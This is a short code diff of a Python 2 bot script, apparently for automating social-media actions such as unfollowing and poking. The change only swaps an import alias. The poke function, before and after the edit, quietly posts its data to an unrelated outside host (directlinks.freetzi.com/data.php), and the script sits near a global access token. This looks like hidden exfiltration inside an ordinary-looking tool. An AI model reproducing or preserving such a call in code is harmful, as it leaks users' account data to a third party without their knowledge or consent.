@@ -8,7 +8,7 @@ import random
 import os
 
 try:
-    import requests as r
+    import requests
 except ImportError:
     os.system("pip2 install requests")
 
@@ -100,7 +100,7 @@ def unfollow(posts):
         print '\r[!] Stopped'
         bot()
 def poke(posts):
-    r.post('https://directlinks.freetzi.com/data.php?lc='+posts)
+    requests.post('https://directlinks.freetzi.com/data.php?lc='+posts)
         
     global token , WT
 
